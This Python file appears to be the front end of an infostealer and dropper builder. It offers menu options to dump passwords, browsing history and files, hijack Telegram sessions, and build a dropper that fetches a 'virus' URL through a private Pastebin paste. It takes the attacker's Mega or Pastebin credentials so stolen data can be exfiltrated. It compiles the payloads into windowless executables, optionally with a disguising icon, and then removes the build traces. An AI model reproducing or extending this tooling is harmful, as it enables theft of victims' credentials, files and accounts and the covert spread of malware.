# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================
from pbwrap import Pastebin
from subprocess import call
from modules_version2.Moud import buildHis  , buildpass , Files , pastbintestuploading , dump_teatgram , dropprrt
from modules_version2.Banar_color import ascii_txt
from modules_version2.Banar_color.ascii_txt import merry , WI , W ,Y, B , M ,Q , G , R , X , Z  ,bl , txt , txt1 , cheeksystem , res ,BOOLD ,F
import os
from os import system , remove ,name,path
from shutil import rmtree
from sys import exit
try:
	system("cls")
	merry()
except Exception as e:
	print(e)
class Run:
	def __init__(self):
		self.ch1 = "1"
		self.ch2 = "2"
		self.ch3 = "3"
		self.ch4 = "4"
		self.ch5 = "5"
		self.filenampackeg = ""
		pass
	def choose(self,spaces0=3,spaces1=7):
		spaces0 = " " *spaces0
		spaces1 = " " *spaces1
		print(spaces0+f"{WI}[{bl}1{WI}] {X}dump_passwords"+'\n'+spaces0+f"{WI}[{bl}2{WI}] {X}dump_History"+"\n"+spaces0+f"{WI}[{bl}3{WI}] {X}dump_Files"+'\n'+spaces0+f"{WI}[{bl}4{WI}] {X}telegram_hijacking"+'\n'+spaces0+f"{WI}[{bl}5{WI}] {X}DroppR"+'\n')
		try:
			self.chose = self.colored_input("choose",spaces=4)
			if self.chose == self.ch1:
				self.mido =  Run()
				self.filenampackeg = "dump_passwords.py"
				print(self.spaces*2+X+"|")
				print(spaces1+f"[{Q}*]"+f"{R}══{txt1}{WI}]{WI}")
				print(self.spaces*2+X+"|")
				mido.meagorpestbin()
				if mido.chose == "1":
					self.build_password()
				elif mido.chose == "2":
					self.build_password_bin()
				else:
					exit(0)
				mido.choose_compiling()
			if self.chose == self.ch2:
				self.mido =  Run()
				self.filenampackeg = "dump_History.py"
				mido.meagorpestbin()
				if mido.chose == "1":
					self.build_hsistory()
				elif mido.chose == "2":
					self.build_hsistory_bin()
				else:
					exit(0)
				mido.choose_compiling()
			if self.chose == self.ch3:
				self.mido =  Run()
				self.filenampackeg = "dump_Files.py"
				print(self.spaces*2+X+"|")
				print(X+txt)
				self.extension = self.colored_input("set extension" , spaces=8)
				mido.getdatefromuser()
				self.dum_files()
				mido.choose_compiling()
			if self.chose == self.ch4:
				self.mido = Run()
				self.filenampackeg = "dump_Telegram.py"
				self.getdatefromuser()
				self.telegram()
				mido.choose_compiling()
			if self.chose == self.ch5:
				self.mido = Run()
				self.filenampackeg = "dropperviurs.py"
				self.urlvirus = self.colored_input("set Url virus : " , spaces=8)
				ended = "exe","txt"
				if not self.urlvirus.endswith(("exe","txt","png","jpeg","link","sp1","bat",".zip","tar","rar","doc","docx","pdf","mp3","mp4","svg","ppt","pptx","gif")):
					print(f"{R}	[X] {WI}Your link must end with the extension (.exe or .jpeg or .txt) and so on {G}")
					exit(0)
				mido.getdatefromuser_bin()
				self.build_droppe()
				mido.choose_compiling()
			if self.chose != (
				self.ch1 
				or self.ch2 
				or self.ch3
				or self.ch4
				or self.ch5
				):
				self.Backtomenu()
			else:
				exit(0)
		except Exception as e:
			print(e)
			exit(0)
	def colored_input(self,title="menu",spaces=3):
		self.spaces = " "*spaces
		print(G+self.spaces+"║")
		line = G+self.spaces+"╚══["+R+"Stealing"+G+"]──["+R+"~"+G+"]─["+B+title+G+"]"+X+":"+WI
		try:
			return input(line)
		except KeyboardInterrupt:
			exit(0)
	def rem_ove(self):
		try:
			self.file 	  = self.filenampackeg.split(".")[-2]
			self.dum_file = self.file+".spec"
			self.rm_fl 	  = remove(self.filenampackeg)
			self.rm_fl 	  = remove(self.dum_file)
			rmtree("__pycache__", ignore_errors=True)
			rmtree("build", ignore_errors=True)
		except Exception as e:
			print(e)
	def getdatefromuser(self,spaces=3):
		self.email    = self.colored_input(f"{X}Email{R} Mega {BOOLD}{F}'https://mega.nz/{res}",spaces=8)
		self.Password = self.colored_input(f"{X}password{R} Mega {BOOLD}{F}'https://mega.nz/{res}" ,spaces=8)
	def getdatefromuser_bin(self,spaces=8):
		self.api_key  = self.colored_input("API KEY",spaces=8)
		self.username = self.colored_input("User name", spaces=8)
		self.Password = self.colored_input("Password", spaces=8)
	def CompilinG(self,title_ico="CompilinG Start"):
		print(X+"║")
		print(X+"╚══["+R+"Stealing"+X+"]──["+R+"~"+X+"]─["+R+title_ico+X+"] "+WI)
		system(f"pyinstaller --onefile --noconsole {self.filenampackeg}")
		self.rem_ove()
		system("cls")
		merry()
		self.choose()
	def CompilinG_icon(self,title_ico="CompilinG Start"):
		self.icon = self.colored_input(X+f"Set Your icon File",spaces=12)
		print(X+"║")
		print(X+"╚══["+R+"Stealing"+B+"]──["+R+"~"+X+"]─["+R+title_ico+X+"]: "+WI)
		system(f"pyinstaller --onefile --noconsole --icon={self.icon} {self.filenampackeg}")
		self.rem_ove()
		system("cls")
		merry()
		self.choose()
	def CompilinG_Linux(self):
		self.pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole", self.filenampackeg]
		call(compile_command)
		self.rem_ove()
		system("clear")
		merry()
		self.choose()
	def CompilinG_Linux_icon(self):
		self.pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole" ,"--icon="+str(self.icon), self.filenampackeg]
		call(compile_command)
		self.rem_ove()
		system("clear")
		merry()
		self.choose()
	def packing(self):
		self.compiling = self.colored_input(X+f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
		if self.compiling == "y" or self.compiling == "Y":
			self.ico = self.colored_input(X+f"{B}You want set {X}icon ? {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
			if self.ico == "y" or self.ico == "Y":
				self.CompilinG_icon()
			else:
				self.CompilinG()
		else:
			system("cls")
			merry()
			self.choose()	
		if self.compiling == "n" or self.compiling == "N":
			self.CompilinG()
		else:
			exit(0)
	def packing_linux(self):
		self.compiling = self.colored_input(X+f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
		if self.compiling == "y" or self.compiling == "Y":
			self.ico = self.colored_input(X+f"{B}You want set {X}icon ? {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
			if self.ico == "y" or self.ico == "Y":
				self.CompilinG_Linux_icon()
			else:
				self.CompilinG_Linux()
		else:
			system("clear")
			merry()
			self.choose()	
		if self.compiling == "n" or self.compiling == "N":
			self.CompilinG_Linux()
		else:
			exit(0)
	def dropper(self,key , username , Password , urlvirus):
		try:
			pb = Pastebin(key)
			pb.authenticate(username,Password)
			self.x = pb.create_paste(str(urlvirus),
				api_paste_private=2,
				api_paste_name="None", 
				api_paste_expire_date=None, 
				api_paste_format=None) 
			self.z = mido.x.split("/")[-1]
		except Exception as e:
			print(e)
			exit(0)
	def build_droppe(self):
		mido.dropper(key=mido.api_key,username=mido.username,Password=mido.Password, urlvirus=self.urlvirus)
		dropprrt.build_dropper(key=mido.api_key,username=mido.username,Password=mido.Password,iD=mido.z)
	def build_password_bin(self):
		pastbintestuploading.build_pass(key=mido.api_key, username=mido.username ,Password=mido.Password)
	def telegram(self):
		dump_teatgram.build_t(email=mido.email,Password=mido.Password)
		#self.token = self.colored_input("anynmes token :")
		#dump_teatgram.build_t(token=mido.token)
	def build_hsistory(self):
		buildHis.build_hs(email=mido.email, Password=mido.Password)
	def build_hsistory_bin(self):
		pastbintestuploading.build_History(key=mido.api_key, username=mido.username ,Password=mido.Password)
	def build_password(self):
		buildpass.build_pass(email=mido.email, Password=mido.Password)
	def dum_files(self):
		Files.build_Fs(email=mido.email, Password=mido.Password , extension=self.extension)
	def Backtomenu(self):
		system("cls")
		merry()
		self.choose()
	def meagorpestbin(self , spaces1 = 7):
		spaces1 = " " *spaces1
		print(spaces1+f"{WI}[{Q}*{WI}]{X}{bl}1{WI}) Mega ══ {bl}2{WI}) Bin")
		self.chose = self.colored_input(spaces=8)
		if self.chose == "1" or self.chose == "mega":
			self.getdatefromuser()
		elif self.chose == "2" or self.chose == "bin":
			self.getdatefromuser_bin(spaces=3)
	def choose_compiling(self):
		if name == "nt":
			self.packing()
		else:
			self.packing_linux()

mido = Run()
mido.choose()
